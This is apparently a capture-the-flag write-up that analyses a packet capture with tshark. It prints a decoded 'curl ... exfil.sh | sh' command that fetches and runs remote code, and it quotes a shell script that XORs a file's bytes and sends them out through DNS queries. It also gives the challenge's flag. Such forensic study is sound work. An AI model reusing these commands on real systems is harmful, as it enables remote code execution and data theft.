# phantom-logger

Answer to the q1: `Clientul verifică mai întâi cache-ul său local și, dacă nu găsește o intrare validă, transmite cererea către un resolver DNS.`

For q2:
I started by running this command: 
> `cat capture.pcapng | tshark -r - -Y "http.request.method==GET"`

the output:
![[phantom-logger.img1.png]]

Since the name is phantom-logger, the idea of a log.txt file seems interesting.
So I ran the command:
> `cat capture.pcapng | tshark -r - -Y "http.request.method==GET and ip.src==192.168.0.253" -V`

The output was a lot of text and stuff, but this string got my atention: `Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGFja2VyMzk1LUFMVC1GNC9VcGxvYWRlZF9maWxlcy9yZWZzL2hlYWRzL21haW4vZXhmaWwuc2ggfCBzaA==`

It was base64 encoded. The decoded string was: curl https://raw.githubusercontent.com/Hacker395-ALT-F4/Uploaded_files/refs/heads/main/exfil.sh | sh

But there I get a 404 error when I try to access the link.

Also this string was interesting: `ZWNobyAnTm90aGluZyBzcGVjaWFsJw==`
Decoded: `echo 'Nothing special'`

so by the looks of it, this type of requests were some commands:
```
Hypertext Transfer Protocol
    GET /log.php HTTP/1.1\r\n
        Request Method: GET
        Request URI: /log.php
        Request Version: HTTP/1.1
    Host: 192.168.0.166\r\n
    User-Agent: MozillaFirefox Y3VybCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSGFja2VyMzk1LUFMVC1GNC9VcGxvYWRlZF9maWxlcy9yZWZzL2hlYWRzL21haW4vZXhmaWwuc2ggfCBzaA==\r\n
    Accept-Encoding: gzip, deflate\r\n
    Accept: */*\r\n
    Connection: keep-alive\r\n
    \r\n
    [Full request URI: http://192.168.0.166/log.php]

```

I also found after running this command:
> `cat capture.pcapng | tshark -r - -Y 'http.request.uri contains "/log.php"' -V`

I also saw some requests to some domains that had rocsc in the name. After grabbing all of them I got some numbers and I tried to decode them, but nothing made sens.
```
47, 103, 117, 15, 14, 2, 10, 66, 85, 4, 82, 18, 89, 82, 5, 21, 84, 7, 11, 68, 95, 4, 82, 65, 91, 2, 82, 22, 95, 86, 81, 65, 8, 87, 4, 22, 92, 85, 87, 70, 13, 81, 10, 69, 88, 80, 6, 77, 84, 87, 85, 23, 14, 2, 2, 65, 94, 82, 6, 21, 9, 6, 87, 66, 88, 10, 11, 70, 17
```

So I decided to look on github for this user:
Hacker395-ALT-F4 (the user from the frist string)
 - the repo: https://github.com/Hacker395-ALT-F4/Uploaded_files/
 - the commit: https://github.com/Hacker395-ALT-F4/Uploaded_files/commit/54bda9536f3a3b99a05aa4ad060cbe30c05d03cc#diff-15f3012b34d7e72c6df6621826885c7bafa4aeff696752f00f429a18934b0c79R1-R27

I found him and he only had 1 repo.
In the repo was just a readme, but he had 4 commits. And when I looked trough the commits I found one that had this:
```
KEY='l33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33tl33t'
FLAG_CONTENT="$(cat flag.txt)"

LEN=$(printf %s "$KEY" | wc -c)
echo $LEN
F_LEN=$(printf %s "$FLAG_CONTENT" | wc -c)

i=0
while [ "$i" -lt "$F_LEN" ]
do
      char="$(printf %s "$FLAG_CONTENT" | cut -b $((i + 1)))"
  echo $char
    ascii=$(printf '%d' "'$char")
  
  echo $ascii
    k_idx=$((i+1 % LEN))
  k_char="$(printf %s \"$KEY\" | cut -b $((k_idx + 1)))"
  k_ascii=$(printf '%d' "'$k_char")
  echo $k_char
  xored_val=$((ascii ^ k_ascii))
  echo $xored_val
    dig +short "${xored_val}.rocsc.ro" @192.168.0.1

    sleep 0.1

  i=$((i + 1))
done
```

So I made a decoder script in python do get the flag:
[[decoder-phantom-logger.py]]

the numbers in the decoder script are numbers from the requests that have rocsc, but the unique ones in order I got them (`cat capture.pcapng | tshark -r - -Y dns -T fields -e dns.qry.name -e dns.resp.name | grep 'rocsc.ro' > numbs.txt`)


flag: `CTF{b19697af5a6a848037a571ab3eb5dd7b0fd2ab914c598dfcb1152a5ae5d64982}`